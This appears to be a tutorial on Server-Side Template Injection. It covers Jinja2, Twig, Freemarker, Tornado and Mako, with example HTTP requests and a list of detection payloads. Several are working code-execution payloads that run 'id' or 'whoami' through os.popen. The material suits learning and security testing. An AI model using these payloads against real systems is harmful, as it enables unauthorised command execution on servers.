# Description

**Server-Side Template Injection (SSTI)** is a web application vulnerability that occurs when user input is embedded directly into a server-side template, allowing an attacker to execute arbitrary code on the server. This vulnerability arises when the application fails to properly sanitize user input before using it in a template rendering engine.

### How Does SSTI Vulnerability Occur?

SSTI occurs due to insecure handling of template rendering in web applications. It happens when:
1. **User Input is Used in Templates**: The application allows user input to be directly embedded in server-side templates for rendering.
2. **Lack of Input Sanitization**: The user-provided data is not validated, sanitized, or properly escaped, making it possible for malicious input to be interpreted as template code.
3. **Insecure Template Engines**: Some template engines allow code execution or direct access to server resources if provided with crafted input.

Popular template engines vulnerable to SSTI include Jinja2 (Python), Twig (PHP), Freemarker (Java), and others.

### Where to Put an SSTI Payload?

An SSTI payload is placed in any input field, URL parameter, or HTTP header where the data is used in server-side templates. Common areas include:
- **Form fields that are used in rendering responses** (e.g., feedback forms, profile descriptions).
- **URL parameters that affect template rendering**.
- **HTTP request headers, if used in templates**.

### Examples of HTTP Requests with SSTI Payloads

Here are some examples of SSTI payloads used in various contexts:

#### 1. Basic SSTI in a Python Flask/Jinja2 Application

If an application uses Jinja2 and directly renders user input, a payload can be used to execute Python code.

**Malicious Payload (`{{7*7}}`)**:
- When rendered in Jinja2, this payload evaluates `7*7` and returns `49`.

**Example HTTP Request**:
```http
GET /greeting?name={{7*7}} HTTP/1.1
Host: vulnerable-website.com
```
In this example, if the server-side code uses `name` in a Jinja2 template like this:
```python
return render_template('greeting.html', name=request.args.get('name'))
```
The output rendered would be `49` instead of `{{7*7}}`.

#### 2. Exploiting SSTI to Execute Arbitrary Code

Advanced SSTI payloads can execute arbitrary server-side commands or code.

**Malicious Payload for Jinja2 (`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`)**:
- This payload tries to access the `os` module and execute the `id` command, potentially revealing user and group information.

**Example HTTP Request**:
```http
POST /feedback HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 82

message={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```
If the `message` parameter is rendered directly in a Jinja2 template, it could execute the `id` command on the server.

#### 3. SSTI in a PHP Application Using Twig

For Twig template engines, SSTI payloads can be used to achieve code execution if the application does not filter user input.

**Malicious Payload (`{{7*7}}`)**:
- Like in Jinja2, this payload would be evaluated and produce `49`.

**Example HTTP Request**:
```http
GET /profile?bio={{7*7}} HTTP/1.1
Host: vulnerable-website.com
```
If the application uses:
```php
echo $twig->render('profile.html', ['bio' => $_GET['bio']]);
```
It could render `49` on the profile page.

#### 4. Java Application Using Freemarker

In Freemarker, SSTI can occur if input is evaluated as part of the template rendering.

**Malicious Payload (`${7*7}`)**:
- In Freemarker, `${7*7}` would evaluate to `49`.

**Example HTTP Request**:
```http
POST /submit HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

comment=${7*7}
```
If the application uses the input in the template:
```java
template.process(dataModel, out);
```
It could output `49` instead of `${7*7}`.

SSTI vulnerabilities can lead to severe consequences, such as remote code execution or unauthorized access to sensitive data, making secure template handling crucial for web applications.
### Breaking Out of Expressions

In more complex cases, the vulnerability might not be evident from a simple mathematical operation. For example, if user input is placed within a template expression, like so:
```python
greeting = getQueryParameter('greeting')
engine.render("Hello {{" + greeting + "}}", data)
```
- **In this example, the request URL might be:**
   ```
   http://vulnerable-website.com/?greeting=data.username
   ```

- **Output:**
   ```
   Hello Cyborg71
   ```

To test for SSTI, try injecting additional template syntax:
- **Injection Example:**
   ```
   http://vulnerable-website.com/?greeting=data.username}}<tag>
   ```

If the server-side template engine renders the input correctly, potentially including the arbitrary HTML, like:
```
Hello Cyborg71<tag>
```
It indicates that the application is vulnerable to SSTI because the template syntax allowed breaking out of the original expression.

# SSTI Payloads For Detection
```html
${{<%[%'"}}%\
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```
### Tornado(Python)
```
{{7*7}}
```
```python
{{__import__('os').popen('whoami').read()}}
```
### Mako(Python)
```
${7*7}
```
```python
${self.module.cache.util.os.popen("whoami").read()}
```
